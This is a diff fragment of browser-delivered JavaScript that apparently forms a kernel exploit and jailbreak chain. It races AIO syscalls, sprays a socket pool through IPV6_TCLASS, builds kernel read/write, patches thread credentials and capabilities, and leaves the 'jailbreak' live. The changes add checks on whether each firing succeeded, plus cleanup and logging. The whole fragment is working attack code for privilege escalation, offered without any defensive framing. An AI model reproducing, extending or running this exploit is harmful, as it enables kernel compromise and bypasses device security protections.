@@ -1401,6 +1728,8 @@ let allDone = false,
           moved +
           " node0_sink=" +
           n0 +
+          " forced=" +
+          (faked ? 1 : 0) +
           " f_socket=" +
           w.idx +
           " f_hits=" +
@@ -1417,7 +1746,6 @@ let allDone = false,
           "node0 fired but no pool socket carries the" +
             " state write -- F went to something outside the pool",
         );
-      reapNow("a=" + armCount);
       return moved;
     }
 
@@ -1469,6 +1797,7 @@ let allDone = false,
       }
       const mA = runChain(i, "passA");
       if (mA === null) return;
+      if (!fireOk("passA")) return;
       if (mA <= 0) {
         mark(
           "PR-PASSA-NOCROSS",
@@ -1568,6 +1897,7 @@ let allDone = false,
       }
       const mB = runChain(i, "passB");
       if (mB === null) return;
+      if (!fireOk("passB")) return;
       if (mB <= 0) {
         mark(
           "PR-PASSB-NOCROSS",
@@ -1779,6 +2109,7 @@ let allDone = false,
       }
       put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
       if (runChain(idx, "anchor-sweep") === null) return;
+      if (!fireOk("anchor-sweep")) return;
     }
 
     function simPattern(bv, low) {
@@ -1942,6 +2273,7 @@ let allDone = false,
       for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
+      if (!fireOk(label)) return null;
       const m = 0x40000000 - sDv.getInt32(0, true);
       return { m: m, v: m > 0 ? n - m + 1 : 0 };
     }
@@ -1959,6 +2291,7 @@ let allDone = false,
       }
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
+      if (!fireOk(label)) return null;
       let obs = "";
       for (let k = 0; k < SWEEP; k++)
         obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
@@ -2149,6 +2482,7 @@ let allDone = false,
         });
       put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
       if (runChain(i, label) === null) return null;
+      if (!fireOk(label)) return null;
       const out = [];
       for (let q = 0; q < jobs.length; q++) {
         const j = jobs[q];
@@ -2174,6 +2508,7 @@ let allDone = false,
     if (kfSock >= 0) {
       opened.push(kfSock);
       const tAb = new ArrayBuffer(4);
+      keepAlive.push(tAb);
       const tDv = new DataView(tAb);
       tDv.setInt32(0, KF_MARK, true);
       sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
@@ -2284,6 +2619,16 @@ let allDone = false,
           i,
       );
       if (runChain(i, "restore+unhide+caps") === null) return;
+      if (!fireOk("restore+unhide+caps")) {
+        if (lastFire.n0 === 1) {
+          capsWrote = capsPend;
+          mark(
+            "CAPS-WROTE-UNVERIFIED",
+            "caps=" + capsPend + " f_socket=" + lastFire.fsock,
+          );
+        }
+        return;
+      }
       capsWrote = capsPend;
     }
     mark(
@@ -2404,6 +2749,8 @@ let allDone = false,
         if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
           allDone = true;
         } else if (runChain(i, "krw-setup") === null) {
+          allDone = true;
+        } else if (!fireOk("krw-setup")) {
           allDone = true;
         } else {
           const kmAb = new ArrayBuffer(8);
@@ -3130,19 +3477,18 @@ let allDone = false,
               );
             } catch (e6) {
               tdOk = false;
-              mark(
-                "JB-TDUCRED-THREW",
-                (e6 && e6.message) || String(e6),
-              );
+              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
             }
 
             let restoreOk = true;
             if (jbRestoreHook && !KEEP_JB) {
               restoreOk = !!jbRestoreHook("end-of-run");
-            } else if (jbRestoreHook && KEEP_JB) {
+            } else if (jbRestoreHook) {
               mark(
                 "JB-KEEP",
-                "?keepjb=1 -- jailbreak left LIVE until pagehide",
+                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
+                  " be restored on pagehide; if the browser is killed instead," +
+                  " REBOOT rather than closing it.",
               );
               window.addEventListener("pagehide", function () {
                 try {
@@ -3252,7 +3598,7 @@ let allDone = false,
                 (jbDone ? 1 : 0) +
                 " kpatched=" +
                 (kpDone ? 1 : 0) +
-                " payload_thread=" +
+                " payload_running=" +
                 (plDone ? 1 : 0) +
                 " stable=" +
                 (stable ? 1 : 0) +
@@ -3260,8 +3606,6 @@ let allDone = false,
                 (tdOk ? 1 : 0) +
                 " restoreOk=" +
                 (restoreOk ? 1 : 0) +
-                " jb_restored=" +
-                (jbRestored ? 1 : 0) +
                 " armings=" +
                 armCount,
             );
@@ -3391,7 +3735,9 @@ let allDone = false,
           " reboot=restores",
       );
     }
+    allDone = true;
 
+    reapNow("final a=" + armCount);
     setNode0(0, N0SINK);
     let renew = 0;
     for (const fd of POOL)
@@ -3411,6 +3757,71 @@ let allDone = false,
         "  (workers deliberately NOT terminated: their td_proc is corrupt" +
         " and terminate() would make them syscall)",
     );
+
+    const drWbAb = new ArrayBuffer(NBLOCK * 0x40);
+    keepAlive.push(drWbAb);
+    const drStAb = new ArrayBuffer(NBLOCK * 4);
+    keepAlive.push(drStAb);
+    const drStDv = new DataView(drStAb);
+    const drStAd = bufAddr(drStAb);
+    const drBidAd = bufAddr(bidAb);
+
+    let drGate = true;
+    let drGateSt = "";
+    const drGatePoll = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
+    for (let k = 0; k < NUM; k++) {
+      const st = stDv2.getUint32(k * 4, true) >>> 0;
+      drGateSt += (k ? "," : "") + st.toString(16);
+      if ((st & 0xffff) < 3 && (st & 0x80000000) === 0) drGate = false;
+    }
+    mark(
+      "PR-GATE",
+      "poll=" +
+        drGatePoll +
+        " ok=" +
+        (drGate ? 1 : 0) +
+        " st=[" +
+        drGateSt +
+        "] rule=every_race_id_terminal_or_gone",
+    );
+
+    if (!drGate) {
+      mark(
+        "PR-DRAIN-SKIPPED",
+        "a race request is still live -- workers NOT released",
+      );
+    } else {
+      const drWr = sc(SYS.write, bsp1, bufAddr(drWbAb), NBLOCK * 0x40).i32;
+      let drSpins = 0;
+      let drDone = 0;
+      for (; drSpins < 200; drSpins++) {
+        sc(SYS.aio_multi_poll, drBidAd, NBLOCK, drStAd);
+        drDone = 0;
+        for (let k = 0; k < NBLOCK; k++)
+          if ((drStDv.getUint32(k * 4, true) & 0xffff) >= 3) drDone++;
+        if (drDone === NBLOCK) break;
+      }
+      let drSt = "";
+      for (let k = 0; k < NBLOCK; k++)
+        drSt +=
+          (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
+      const drDel = sc(SYS.aio_multi_delete, drBidAd, NBLOCK, drStAd).i32;
+      mark(
+        "PR-DRAIN",
+        "wr=" +
+          drWr +
+          " done=" +
+          drDone +
+          "/" +
+          NBLOCK +
+          " spins=" +
+          drSpins +
+          " st=[" +
+          drSt +
+          "] del=" +
+          drDel,
+      );
+    }
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
     state("threw", "bad");
